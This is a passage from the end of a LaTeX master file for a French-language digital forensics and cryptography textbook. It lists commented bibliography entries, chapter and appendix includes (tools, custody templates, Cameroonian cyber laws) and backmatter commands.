%   booktitle = {Proc. EVT/WOTE}, year = {2009}
% }
% @misc{iacr2025,
%   author = {{International Association for Cryptologic Research}},
%   title  = {2025 IACR Election Update}, year = {2025},
%   note   = {Online; iacr.org/news/item/27138}
% }
% @article{johnson2001ecdsa,
%   author  = {Johnson, Don and Menezes, Alfred and Vanstone, Scott},
%   title   = {The Elliptic Curve Digital Signature Algorithm (ECDSA)},
%   journal = {Int. J. Inf. Secur.}, volume = {1}, number = {1},
%   pages   = {36--63}, year = {2001}
% }
    
        \input{partie6/P06_C27_analyse_primitives}
     
        \input{partie6/P06_C28_protocole_ZKNR}
    
        \input{partie6/P06_C29_fondements_cryptanalyse}
    
        \input{partie6/P06_C30_methodologie_formelle}
     
        \input{partie6/P06_C31_cas_pratique_zknr}
     
% --------------------------------------------------------------------------
% ANNEXES
% --------------------------------------------------------------------------
\appendix

    \input{annexes/Ann_A_glossaire}
    % Glossaire étendu (200+ termes). Termes camerounais et africains ajoutés.

    \input{annexes/Ann_B_outils}
    % Référentiel complet des outils forensiques (open source + commerciaux).
    % Tableau : outil / OS / usage / commande de base / niveau.

    \input{annexes/Ann_C_templates}
    % Templates opérationnels : formulaire chaîne de custody, rapport forensique,
    % fiche de saisie de scène de crime numérique.

    \input{annexes/Ann_D_lois}
    % Textes législatifs en intégralité :
    % Loi 2010/012, Loi 2010/013, extraits CEMAC pertinents.

    \input{annexes/Ann_E_bibliographie}
    % Bibliographie complète (style IEEE via biber).

    \input{annexes/Ann_F_contacts}
    % Contacts, organisations, conférences, communautés en ligne.


% --------------------------------------------------------------------------
% ÉLÉMENTS FINAUX
% --------------------------------------------------------------------------
\backmatter

    \printbibliography[heading=bibintoc, title={Références bibliographiques}]

    \printindex

\end{document}

% ============================================================================
% Fin de TPIN_main.tex
% ============================================================================
